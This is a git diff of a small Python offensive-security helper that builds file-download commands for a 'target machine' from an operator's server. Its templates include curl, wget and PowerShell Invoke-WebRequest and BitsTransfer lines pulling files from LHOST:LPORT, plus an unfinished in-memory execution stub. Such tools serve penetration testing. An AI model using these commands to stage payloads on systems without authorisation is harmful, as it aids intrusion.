@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 # Author: Charlie BROMBERG (Shutdown - @_nwodtuhs)
+# Author: Amine B (en1ma - @_1mean)
 
 import argparse
 import sys
@@ -27,15 +28,11 @@ def MENU_WITH_CUSTOM(title, menu_list):
     menu_list.append('Custom')
     selection = MENU(title, menu_list)
     if selection == 'Custom':
-        print('Custom address?')
+        print(f'(custom) {title}')
         if platform.system() == 'Windows':
             selection = input('>> ')
         else:
             selection = input(Fore.RED + Style.BRIGHT + '> ' + Style.RESET_ALL)
-        sys.stdout.write("\033[F") #back to previous line
-        sys.stdout.write("\033[K") #clear line
-        sys.stdout.write("\033[F") #back to previous line
-        sys.stdout.write("\033[K") #clear line
         return selection
     else:
         return selection.split('(')[1].split(')')[0]
@@ -56,16 +53,28 @@ def MENU_interface():
 
     return MENU_WITH_CUSTOM("Interface?", menu_list)
 
+def list_downloaders():
+    print(Fore.BLUE + Style.BRIGHT + 'Windows downloaders' + Style.RESET_ALL)
+    for downloader in sorted(windows.keys()):
+        print('   - ' + downloader)
+    print()
+    print(Fore.BLUE + Style.BRIGHT + 'Linux downloaders' + Style.RESET_ALL)
+    for downloader in sorted(linux.keys()):
+        print('   - ' + downloader)
+    quit()
+
 def get_options():
     parser = argparse.ArgumentParser(description='Generate a file downloader command', formatter_class=argparse.RawTextHelpFormatter)
-    parser.add_argument('-lp', '--lport', dest='LPORT', type=int, help='Server port')
-    parser.add_argument('-lh', '--lhost', dest='LHOST', type=int, help='Server address')
+    parser.add_argument('-lp', '--lport', dest='LPORT', type=str, help='Server port')
+    parser.add_argument('-lh', '--lhost', dest='LHOST', type=str, help='Server address')
     parser.add_argument('-t', '--target-os', dest='TARGETOS', type=str, choices={"windows","linux"}, help='Target machine operating system')
     parser.add_argument('-d', '--downloader', dest='TYPE', type=str, help='Downloader')
-    parser.add_argument('-f', '--inputfile', dest='INPUTFILE', type=str, help='File to be downloaded')
-    parser.add_argument('-o', '--outputfile', dest='OUTPUTFILE', type=str, help='File to write on the target machine')
+    parser.add_argument('-f', '--input-file', dest='INPUTFILE', type=str, help='File to be downloaded')
+    parser.add_argument('-o', '--output-file', dest='OUTPUTFILE', type=str, help='File to write on the target machine')
     parser.add_argument('-l', '--list', dest='LIST', action='store_true', help='Print all the commands UberFiles can generate')
     options = parser.parse_args()
+    if options.LIST:
+        list_downloaders()
     if not options.TARGETOS:
         options.TARGETOS = MENU("What operating system is the target running?", ['windows','linux'])
     if not options.TYPE:
@@ -105,11 +114,11 @@ def add_downloader(downloaders_dict, type, downloader, notes=None):
 
 # Add downloaders to the main dictionnaries: windows and linux
 def populate_downloaders():
+    ## TODO: populate this
     add_downloader(linux, 'curl', '''curl http://{LHOST}:{LPORT}/{INPUTFILE} -O {OUTPUTFILE}''')
     add_downloader(linux, 'wget', '''wget {LHOST}:{LPORT}/{INPUTFILE} -O {OUTPUTFILE}''')
     add_downloader(windows, 'powershell', '''powershell.exe Invoke-WebRequest -Uri http://{LHOST}:{LPORT}/{INPUTFILE} -OutFile '{OUTPUTFILE}' ''')
     add_downloader(windows, 'powershell', '''powershell.exe Start-BitsTransfer -Source http://{LHOST}:{LPORT}/{INPUTFILE} -Destination '{OUTPUTFILE}' ''')
-    add_downloader(windows, 'powershell', '''powershell.exe (New-Object System.Net.WebClient).DownloadFile(‘http://{LHOST}:{LPORT}/{INPUTFILE}, '{OUTPUTFILE}')''')
     add_downloader(downloaders_dict=windows, type='powershell', notes="Execute in memory without writing to disk", downloader='''powershell.exe IED()TODOOOO''')
 
 if __name__ == '__main__':
@@ -126,3 +135,5 @@ if __name__ == '__main__':
         if notes is not None:
             print_notes = notes + ' '
         print(Fore.BLUE + Style.BRIGHT + '[' + str(downloader_index) + '] ' + print_notes + Style.RESET_ALL + print_downloader + '\n')
+    cmdline = f'{sys.argv[0]} --lhost {options.LHOST} --lport {options.LPORT} --target-os {options.TARGETOS} --downloader {options.TYPE} --input-file {options.INPUTFILE} --output-file {options.OUTPUTFILE}'
+    print(Fore.RED + Style.BRIGHT + '---\n[*] ' + "CLI command used " + Style.RESET_ALL + cmdline + '\n')
